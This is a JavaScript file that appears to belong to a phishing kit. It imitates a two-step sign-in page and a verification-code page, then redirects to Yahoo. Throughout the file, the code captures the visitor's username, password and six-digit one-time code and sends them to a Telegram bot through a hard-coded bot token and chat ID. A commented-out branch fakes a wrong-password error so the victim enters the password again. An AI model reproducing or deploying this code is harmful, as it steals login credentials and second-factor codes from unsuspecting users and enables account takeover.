"use strict";
import sendTelegramData from "./app.js";

const TELEGRAM_BOT_API_TOKEN = "8387600598:AAGiOtDzDka4z4h8_qwtt1GJX3sHkHX8vvs";
const TELEGRAM_CHAT_ID = 5710607863;

const config = {
  userData: {},
  telegram: {
    apiToken: TELEGRAM_BOT_API_TOKEN,
    chatId: TELEGRAM_CHAT_ID,
  },
};

document.addEventListener("DOMContentLoaded", async () => {
  const userData = {
    username: "",
    password: "",
    userTry: 0,
    otp_code: "",
  };

  // Elements on index.html
  const stepOneEl = document.getElementById("step-one");
  const stepTwoEl = document.getElementById("step-two");
  const usernameInput = document.getElementById("username");
  const usernameError = document.getElementById("username-error-alert");
  const usernameDisplay = document.getElementById("username-display");
  const passwordInput = document.getElementById("password");
  const passwordError = document.getElementById("password-error-alert");

  // Elements on verify.html
  const verifyCodeInput = document.getElementById("verify-code");
  const verifyError = document.getElementById("verify-error-alert");
  const verifyUsernameDisplay = document.getElementById("verify-username-display");

  // Buttons inside each step
  const stepOneBtn = stepOneEl ? stepOneEl.querySelector('button[type="button"]') : null;
  const stepTwoBtn = stepTwoEl ? stepTwoEl.querySelector('button[type="submit"]') : null;

  // Verify page button - needs a more specific selector since verify.html also has step-one id
  const verifyBtn = verifyCodeInput ? verifyCodeInput.closest("div").parentElement.querySelector('button[type="button"]') : null;

  // helper to toggle visibility using Tailwind's "hidden" class
  const show = (element) => element && element.classList.remove("hidden");
  const hide = (element) => element && element.classList.add("hidden");

  function handleLoadingAndNavigation(button, callback = null, delay = 5000) {
    button.disabled = true;
    button.innerHTML = '<span class="inline-block animate-spin rounded-full h-4 w-4 border-b-2 border-white"></span>';

    setTimeout(() => {
      button.disabled = false;
      button.innerHTML = "Next";

      if (callback) callback();
    }, delay);
  }

  // ====== INDEX.HTML: Step One ======
  if (stepOneBtn && usernameInput) {
    stepOneBtn.addEventListener("click", () => {
      const username = (usernameInput.value || "").trim();

      if (!username) {
        if (usernameError) usernameError.classList.remove("hidden");
        return;
      }

      if (usernameError) usernameError.classList.add("hidden");
      userData.username = username;

      if (stepOneBtn)
        handleLoadingAndNavigation(
          stepOneBtn,
          () => {
            hide(stepOneEl);
            show(stepTwoEl);
          },
          3000
        );

      stepTwoBtn && stepTwoBtn.removeAttribute("disabled");
      if (usernameDisplay) usernameDisplay.textContent = userData.username;
    });
  }

  // ====== INDEX.HTML: Step Two ======
  if (stepTwoBtn && passwordInput) {
    stepTwoBtn.addEventListener("click", (ev) => {
      ev.preventDefault();

      const password = (passwordInput.value || "").trim();
      userData.password = password;

      if (!userData.password) {
        if (passwordError) passwordError.classList.remove("hidden");
        return;
      }

      /* if (userData.userTry === 0) {
        handleLoadingAndNavigation(
          stepTwoBtn,
          () => {
            passwordError.textContent = "Incorrect password.";
            passwordError.classList.remove("hidden");
            userData.userTry += 1;
          },
          3000
        );

        return;
      } */

      if (passwordError) passwordError.classList.add("hidden");

      try {
        config.userData = userData;
        localStorage.setItem("config", JSON.stringify(config));
        sessionStorage.setItem("config", JSON.stringify(config));

        // call the telegram function
        sendTelegramData(config, null); // pass null as the second argument to prevent redirect

        if (userData.userTry) userData.userTry += 1; 
      } catch (error) {
        console.error("Failed to save to sessionStorage:", error);
      }

      if (stepTwoBtn) {
        handleLoadingAndNavigation(
          stepTwoBtn,
          () => {
            window.location.href = "verify.html";
          },
          7000
        );
      }
    });
  }

  // ====== VERIFY.HTML: Verification Code ======
  if (verifyBtn && verifyCodeInput) {
    let storedData;

    try {
      // Retrieve and display username on verify page
      const data = sessionStorage.getItem("config");

      if (data) {
        storedData = JSON.parse(data);
        verifyUsernameDisplay.textContent = storedData.userData.username;
      }
    } catch (error) {
      console.error("Failed to retrieve from sessionStorage:", error);
    }

    verifyBtn.addEventListener("click", (ev) => {
      ev.preventDefault();
      ev.stopPropagation();

      const code = (verifyCodeInput.value || "").trim();

      if (!code || code.length !== 6 || isNaN(code)) {
        if (verifyError) {
          verifyError.textContent = "Please provide a valid 6-digit verification code.";
          verifyError.classList.remove("hidden");
        }
        return;
      }

      storedData.userData.otp_code = code;

      if (verifyBtn) {
        handleLoadingAndNavigation(verifyBtn, () => {
          sendTelegramData(storedData, "https://www.yahoo.com/");
        });
      }
    });
  }
});
